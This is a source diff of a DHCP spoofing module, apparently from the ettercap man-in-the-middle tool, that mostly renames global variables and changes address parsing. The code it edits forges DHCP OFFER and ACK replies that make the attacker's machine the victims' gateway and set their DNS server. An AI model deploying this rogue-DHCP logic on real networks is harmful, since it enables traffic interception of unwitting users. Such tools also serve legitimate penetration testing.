@@ -76,7 +76,6 @@ void __init dhcp_spoofing_init(void)
  */
 static int dhcp_spoofing_start(char *args)
 {
-   struct in_addr ipaddr;
    char *p;
    int i = 1;
   
@@ -88,7 +87,7 @@ static int dhcp_spoofing_start(char *args)
    /*
     * Check to see if sniff has started - started automatically in text UI
     */
-   if (GBL_UI->type != UI_TEXT && !GBL_SNIFF->active)
+   if (EC_GBL_UI->type != UI_TEXT && !EC_GBL_SNIFF->active)
       SEMIFATAL_ERROR("DHCP spoofing requires sniffing to be active.\n");
    
    /* check the parameter:
@@ -108,21 +107,17 @@ static int dhcp_spoofing_start(char *args)
          
       /* second parameter (the netmask) */
       } else if (i == 2) {
-         /* convert from string */
-         if (inet_aton(p, &ipaddr) == 0)
+         /* convert from string and get the netmask */
+         if (ip_addr_pton(p, &dhcp_netmask) != E_SUCCESS)
             break;
-         /* get the netmask */
-         ip_addr_init(&dhcp_netmask, AF_INET, (u_char *)&ipaddr);
          
       /* third parameter (the dns server) */
       } else if (i == 3) {
          char tmp[MAX_ASCII_ADDR_LEN];
 
-         /* convert from string */
-         if (inet_aton(p, &ipaddr) == 0)
+         /* convert from string and get the netmask */
+         if (ip_addr_pton(p, &dhcp_dns) != E_SUCCESS)
             break;
-         /* get the netmask */
-         ip_addr_init(&dhcp_dns, AF_INET, (u_char *)&ipaddr);
          
          /* all the parameters were parsed correctly... */
          USER_MSG("DHCP spoofing: using specified ip_pool, netmask %s", ip_addr_ntoa(&dhcp_netmask, tmp));
@@ -252,12 +247,12 @@ static void dhcp_spoofing_req(struct packet_object *po)
        * the request does not contain an identifier,
        * use our ip address
        */
-      dhcp->dhcp_sip = *GBL_IFACE->ip.addr32;
+      dhcp->dhcp_sip = *EC_GBL_IFACE->ip.addr32;
       
       /* set it in the options */
-      ip_addr_cpy((u_char*)dhcp_options + 5, &GBL_IFACE->ip);
+      ip_addr_cpy((u_char*)dhcp_options + 5, &EC_GBL_IFACE->ip);
    
-      send_dhcp_reply(&GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, (u_char*)dhcp_hdr, (u_char*)dhcp_options, dhcp_optlen);
+      send_dhcp_reply(&EC_GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, (u_char*)dhcp_hdr, (u_char*)dhcp_options, dhcp_optlen);
    }
 
    USER_MSG("DHCP spoofing: fake ACK [%s] ", mac_addr_ntoa(po->L2.src, tmp));
@@ -294,13 +289,13 @@ static void dhcp_spoofing_disc(struct packet_object *po)
    dhcp->dhcp_yip = *dhcp_free_ip->ip.addr32;
    
    /* set it in the header */
-   dhcp->dhcp_sip = *GBL_IFACE->ip.addr32;
+   dhcp->dhcp_sip = *EC_GBL_IFACE->ip.addr32;
 
    /* set it in the options */
-   ip_addr_cpy((u_char*)dhcp_options + 5, &GBL_IFACE->ip);
+   ip_addr_cpy((u_char*)dhcp_options + 5, &EC_GBL_IFACE->ip);
    
    /* send the packet */
-   send_dhcp_reply(&GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, (u_char*)dhcp_hdr, (u_char*)dhcp_options, dhcp_optlen);
+   send_dhcp_reply(&EC_GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, (u_char*)dhcp_hdr, (u_char*)dhcp_options, dhcp_optlen);
    
    USER_MSG("DHCP spoofing: fake OFFER [%s] ", mac_addr_ntoa(po->L2.src, tmp));
    USER_MSG("offering %s \n", ip_addr_ntoa(&dhcp_free_ip->ip, tmp));
@@ -321,7 +316,7 @@ static void dhcp_setup_options(void)
    DEBUG_MSG("dhcp_setup_options");
 
    /* lease time from conf file */
-   time = htonl(GBL_CONF->dhcp_lease_time);
+   time = htonl(EC_GBL_CONF->dhcp_lease_time);
 
    /* the type of reply */
    *p++ = DHCP_OPT_MSG_TYPE;
@@ -329,13 +324,13 @@ static void dhcp_setup_options(void)
    *p++ = DHCP_ACK;
 
    /* server identifier */
-   put_dhcp_option(DHCP_OPT_SRV_ADDR, GBL_IFACE->ip.addr, ntohs(GBL_IFACE->ip.addr_len), &p);
+   put_dhcp_option(DHCP_OPT_SRV_ADDR, EC_GBL_IFACE->ip.addr, ntohs(EC_GBL_IFACE->ip.addr_len), &p);
    /* lease time */
    put_dhcp_option(DHCP_OPT_LEASE_TIME, (u_int8 *)&time, 4, &p);
    /* the netmask */
    put_dhcp_option(DHCP_OPT_NETMASK, dhcp_netmask.addr, ntohs(dhcp_netmask.addr_len), &p);
    /* the gateway */
-   put_dhcp_option(DHCP_OPT_ROUTER, GBL_IFACE->ip.addr, ntohs(GBL_IFACE->ip.addr_len), &p);
+   put_dhcp_option(DHCP_OPT_ROUTER, EC_GBL_IFACE->ip.addr, ntohs(EC_GBL_IFACE->ip.addr_len), &p);
    /* the dns */
    put_dhcp_option(DHCP_OPT_DNS, dhcp_dns.addr, ntohs(dhcp_dns.addr_len), &p);
 
